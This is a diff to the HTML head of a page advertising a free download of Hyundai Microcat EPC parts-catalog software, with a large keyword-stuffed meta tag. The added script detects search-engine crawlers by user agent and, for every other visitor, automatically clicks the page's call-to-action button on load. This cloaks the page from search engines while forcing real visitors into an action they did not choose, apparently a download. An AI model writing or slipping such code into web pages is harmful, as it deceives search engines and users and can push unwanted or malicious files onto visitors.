@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hyundai Microcat EPC v6 06.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the Hyundai Microcat EPC v6 06.2024 for detailed vehicle parts and accessories catalog in multiple languages for all regions.">
     <meta name="keywords" content="Hyundai Microcat EPC v6 06.2024, Hyundai Microcat EPC v6, Hyundai spare parts catalog, Microcat Hyundai download, Microcat Hyundai EPC download free, Hyundai EPC catalogue free download, Hyundai Microcat 2024, Hyundai parts catalog software, Hyundai Microcat EPC v6 06.2024 free download, Hyundai catalog software, Hyundai vehicle parts software, Hyundai Microcat interface, Hyundai truck parts catalog, Hyundai bus parts catalog, Hyundai passenger vehicle parts, Hyundai vehicle catalog 2024, Microcat Hyundai v6, Hyundai accessories, Hyundai vehicle catalog, Hyundai regional catalog, Microcat Hyundai EPC v6 2024, Hyundai truck parts, Hyundai bus parts, Hyundai parts and accessories, Hyundai spare parts software, hyundai electronic parts catalogue, hyundai vehicle maintenance, hyundai car parts, hyundai parts lookup, hyundai component search, hyundai repair information, hyundai service manual, hyundai technical data, vehicle parts identification, hyundai parts numbers, automotive diagrams, hyundai component lookup, passenger vehicle parts, commercial vehicle parts, hyundai australia parts, hyundai europe parts, hyundai middle east parts, hyundai canada parts, hyundai usa parts, global automotive parts, hyundai vehicle compatibility, automotive fleet maintenance, hyundai parts cross-reference, vehicle repair software, hyundai diagnostics, automotive troubleshooting, hyundai parts ordering, vehicle maintenance schedules, hyundai service information, car repair database, truck maintenance software, bus parts catalog, hyundai oem parts, aftermarket parts lookup, hyundai vehicle systems, automotive technician tools, hyundai parts inventory, car component diagrams, commercial fleet parts, hyundai part specifications, vehicle repair solutions, Hyundai Microcat EPC 2024 updates, Hyundai Microcat EPC download">
     <style>
